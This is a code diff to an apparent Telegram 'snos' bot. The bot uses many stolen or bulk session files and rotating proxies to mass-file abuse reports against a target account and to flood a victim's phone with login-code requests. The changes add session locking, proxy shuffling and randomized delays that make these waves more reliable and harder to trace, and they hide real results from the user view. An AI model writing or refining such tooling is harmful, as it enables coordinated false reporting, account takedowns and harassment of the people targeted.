@@ -524,6 +524,15 @@ def load_sessions() -> list[Path]:
     return sorted(SESSIONS_DIR.glob("*.session"))
 
 
+# one SQLite connection per .session file — concurrent TelegramClients on the
+# same file die with "OperationalError: database is locked"
+_SESSION_LOCKS: dict[str, asyncio.Lock] = {}
+
+
+def _session_lock(session_path: Path) -> asyncio.Lock:
+    return _SESSION_LOCKS.setdefault(session_path.stem, asyncio.Lock())
+
+
 # ── background proxy farm ────────────────────────────────
 PROXY_REFRESH_INTERVAL = 15 * 60   # re-harvest every 15 minutes
 
@@ -563,7 +572,9 @@ _BOT: Bot | None = None   # set in main() when the poller boots
 
 
 def _resolve_logs_chat() -> str | None:
-    """LOGS_CHAT_ID env → logs_chat.json (runtime /setlogs) → admin DM."""
+    """LOGS_CHAT_ID env → logs_chat.json (runtime /setlogs or committed from
+    a run). No silent admin-DM fallback: real logs go ONLY to the Logs channel;
+    if it is not bound yet, nothing leaks elsewhere."""
     env = (os.getenv("LOGS_CHAT_ID") or "").strip()
     if env:
         return env
@@ -574,7 +585,7 @@ def _resolve_logs_chat() -> str | None:
                 return str(v["chat_id"])
     except Exception:
         pass
-    return ADMIN_ID if ADMIN_ID else None
+    return None
 
 
 async def push_send_log(title: str, lines: list[str]) -> None:
@@ -664,62 +675,60 @@ async def fire_reports(target_entity: str, reason_key: str, comment: str, msg_id
     else:
         texts = _unique_texts(pool, shots)
 
-    async def report_one(session_path: Path, proxy: tuple | None, text: str) -> tuple[bool, str]:
-        name = session_path.stem
-        try:
-            client = TelegramClient(
-                str(session_path.with_suffix("")),
-                API_ID,
-                API_HASH,
-                proxy=proxy,
-            )
-            await client.connect()
-            if not await client.is_user_authorized():
-                log.warning("session %s not authorized", name)
+    async def session_worker(sess: Path, idx: int) -> tuple[str, str, list[tuple[int, bool, str]]]:
+        """One connected client per session, REPORT_BURST reports over it.
+        Per-session lock removes 'database is locked' when two methods hit
+        the same session concurrently."""
+        name = sess.stem
+        # unique proxy per (session, run) — shuffle offset each launch
+        proxy = proxies[(idx + random.randint(0, 9999)) % len(proxies)] if proxies else None
+        px_name = proxy[1] if proxy else "direct"
+        rows = []
+        async with _session_lock(sess):
+            client = None
+            try:
+                client = TelegramClient(str(sess.with_suffix("")), API_ID, API_HASH, proxy=proxy)
+                await asyncio.wait_for(client.connect(), timeout=12)
+                if not await client.is_user_authorized():
+                    await client.disconnect()
+                    return name, px_name, [(b, False, "not authorized") for b in range(REPORT_BURST)]
+                entity = await client.get_entity(target_entity)
+                for b in range(REPORT_BURST):
+                    try:
+                        await client(ReportPeerRequest(
+                            peer=entity,
+                            reason=reason_cls(),
+                            message=texts[idx * REPORT_BURST + b],
+                        ))
+                        log.info("reported via %s shot%d (proxy: %s)", name, b + 1, px_name)
+                        rows.append((b, True, ""))
+                    except Exception as e:
+                        log.error("session %s shot%d failed: %s", name, b + 1, e)
+                        rows.append((b, False, f"{type(e).__name__}: {e}"))
+                    await asyncio.sleep(random.uniform(0.4, 1.0))
                 await client.disconnect()
-                return False, "not authorized"
+            except Exception as e:
+                log.error("session %s setup failed: %s", name, e)
+                rows = [(b, False, f"{type(e).__name__}: {e}") for b in range(REPORT_BURST)]
+                try:
+                    if client:
+                        await client.disconnect()
+                except Exception:
+                    pass
+        return name, px_name, rows
 
-            entity = await client.get_entity(target_entity)
-            report_msg = text or comment or "violation"
-            ids = [msg_id] if msg_id else []
-
-            await client(ReportPeerRequest(
-                peer=entity,
-                reason=reason_cls(),
-                message=report_msg,
-            ))
-            log.info("reported via %s (proxy: %s)", name, proxy[1] if proxy else "direct")
-            await client.disconnect()
-            return True, ""
-        except Exception as e:
-            log.error("session %s failed: %s", name, e)
-            return False, f"{type(e).__name__}: {e}"
-
-    tasks = []
-    for i, sess in enumerate(sessions):
-        for b in range(REPORT_BURST):
-            proxy = proxies[(i + b * len(sessions)) % len(proxies)] if proxies else None
-            tasks.append(report_one(sess, proxy, texts[i * REPORT_BURST + b]))
-
-    outcomes = await asyncio.gather(*tasks, return_exceptions=True)
+    outs = await asyncio.gather(*[session_worker(s, i) for i, s in enumerate(sessions)])
     real_lines = []
-    for i, o in enumerate(outcomes):
-        sess_idx = i // REPORT_BURST
-        shot_no = i % REPORT_BURST + 1
-        if isinstance(o, tuple):
-            ok, err = o
-        else:
-            ok, err = False, f"{type(o).__name__}: {o}"
-        results["ok" if ok else "fail"] += 1
-        sname = sessions[sess_idx].stem
-        sproxy = proxies[sess_idx][1] if sess_idx < len(proxies) and proxies[sess_idx] else "direct"
-        results["details"].append({
-            "name": sname, "proxy": sproxy, "ok": ok, "err": err,
-        })
-        real_lines.append(
-            f"{'✅' if ok else '❌'} <code>{sname}</code> shot{shot_no}"
-            f" | {html_mod.escape(sproxy)}"
-            + (f" | {html_mod.escape(err)}" if err else ""))
+    for sname, px_name, rows in outs:
+        for b, ok, err in rows:
+            results["ok" if ok else "fail"] += 1
+            results["details"].append({
+                "name": sname, "proxy": px_name, "ok": ok, "err": err,
+            })
+            real_lines.append(
+                f"{'✅' if ok else '❌'} <code>{sname}</code> shot{b + 1}"
+                f" | {html_mod.escape(px_name)}"
+                + (f" | {html_mod.escape(err)}" if err else ""))
 
     # REAL log of this send → Logs channel, then mask the user view
     await push_send_log(
@@ -1183,32 +1192,33 @@ async def snos_parse_victim(username: str) -> dict:
 async def snos_sendcode_one(session_path: Path, phone: str, px: tuple | None) -> dict:
     name = session_path.stem
     api_id, api_hash = _rand_api()
-    try:
-        client = TelegramClient(str(session_path.with_suffix("")), api_id, api_hash,
-                                proxy=px, system_version=SNOS_SYSTEM_VERSION)
-        await asyncio.wait_for(client.connect(), timeout=8)
-        if not await client.is_user_authorized():
-            await client.disconnect()
-            return {"name": name, "proxy": px[1] if px else "direct", "status": "сессия мертва", "ok": False}
+    async with _session_lock(session_path):
         try:
-            from telethon.tl.functions.auth import SendCodeRequest
-            from telethon.tl.types import CodeSettings
-            await client(SendCodeRequest(phone_number=phone, api_id=api_id,
-                                         api_hash=api_hash, settings=CodeSettings()))
-            await client.disconnect()
-            return {"name": name, "proxy": px[1] if px else "direct", "status": "код отправлен", "ok": True}
-        except Exception as e:
-            await client.disconnect()
-            tail = type(e).__name__
-            sec = getattr(e, "seconds", None)
-            if sec:
+            client = TelegramClient(str(session_path.with_suffix("")), api_id, api_hash,
+                                    proxy=px, system_version=SNOS_SYSTEM_VERSION)
+            await asyncio.wait_for(client.connect(), timeout=8)
+            if not await client.is_user_authorized():
+                await client.disconnect()
+                return {"name": name, "proxy": px[1] if px else "direct", "status": "сессия мертва", "ok": False}
+            try:
+                from telethon.tl.functions.auth import SendCodeRequest
+                from telethon.tl.types import CodeSettings
+                await client(SendCodeRequest(phone_number=phone, api_id=api_id,
+                                             api_hash=api_hash, settings=CodeSettings()))
+                await client.disconnect()
+                return {"name": name, "proxy": px[1] if px else "direct", "status": "код отправлен", "ok": True}
+            except Exception as e:
+                await client.disconnect()
+                tail = type(e).__name__
+                sec = getattr(e, "seconds", None)
+                if sec:
+                    return {"name": name, "proxy": px[1] if px else "direct",
+                            "status": f"flood {sec}s", "ok": False}
                 return {"name": name, "proxy": px[1] if px else "direct",
-                        "status": f"flood {sec}s", "ok": False}
+                        "status": tail, "ok": False}
+        except Exception as e:
             return {"name": name, "proxy": px[1] if px else "direct",
-                    "status": tail, "ok": False}
-    except Exception as e:
-        return {"name": name, "proxy": px[1] if px else "direct",
-                "status": f"{type(e).__name__}: {e}", "ok": False}
+                    "status": f"{type(e).__name__}: {e}", "ok": False}
 
 
 async def _session_alive(session_path: Path, px: tuple | None = None) -> tuple[bool, str]:
@@ -1216,21 +1226,22 @@ async def _session_alive(session_path: Path, px: tuple | None = None) -> tuple[b
     through the whole wave — we check it once and skip."""
     api_id, api_hash = _rand_api()
     client = None
-    try:
-        client = TelegramClient(str(session_path.with_suffix("")), api_id, api_hash,
-                                proxy=px, system_version=SNOS_SYSTEM_VERSION)
-        await asyncio.wait_for(client.connect(), timeout=10)
-        if await client.is_user_authorized():
-            return True, ""
-        return False, "not authorized"
-    except Exception as e:
-        return False, type(e).__name__
-    finally:
+    async with _session_lock(session_path):
         try:
-            if client:
-                await client.disconnect()
-        except Exception:
-            pass
+            client = TelegramClient(str(session_path.with_suffix("")), api_id, api_hash,
+                                    proxy=px, system_version=SNOS_SYSTEM_VERSION)
+            await asyncio.wait_for(client.connect(), timeout=10)
+            if await client.is_user_authorized():
+                return True, ""
+            return False, "not authorized"
+        except Exception as e:
+            return False, type(e).__name__
+        finally:
+            try:
+                if client:
+                    await client.disconnect()
+            except Exception:
+                pass
 
 
 async def _snos_wave_worker(session_path: Path, phone: str, proxies: list[tuple],
